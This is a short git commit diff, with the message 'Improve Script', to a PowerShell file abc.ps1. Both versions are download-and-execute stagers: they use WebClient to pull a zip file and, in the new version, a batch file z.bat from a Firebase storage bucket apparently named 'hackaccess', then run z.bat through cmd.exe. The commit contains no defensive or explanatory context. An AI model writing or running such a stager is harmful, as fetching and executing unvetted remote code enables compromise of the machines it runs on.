791d67e6b1ed91f886369db9efeef4ae24da5bd3
DESKTOP-8M0J74Q\User <nwy140@gmail.com>
2018-01-08 19:21:52 +0800

    Improve Script

--- abc.ps1
+++ abc.ps1
@@ -1,4 +1,5 @@
-﻿$client = new-object System.Net.WebClient
-$client.DownloadFile("https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/abc.zip?alt=media&token=baafa4ad-0276-466e-88d3-5757503cedf4", ".\abc.zip”) 
-
-cmd.exe /c .\z.bat
+    $client = new-object System.Net.WebClient  
+$client.DownloadFile( "https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/abc.zip?alt=media&token=baafa4ad-0276-466e-88d3-5757503cedf4", ".\zk.zip")  
+ $client.DownloadFile( "https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/z.bat?alt=media&token=bc9f3920-3712-4345-82c6-f8d83e49167f",   ".\z.bat")  
+ cmd.exe /c .\z.bat 
+ 
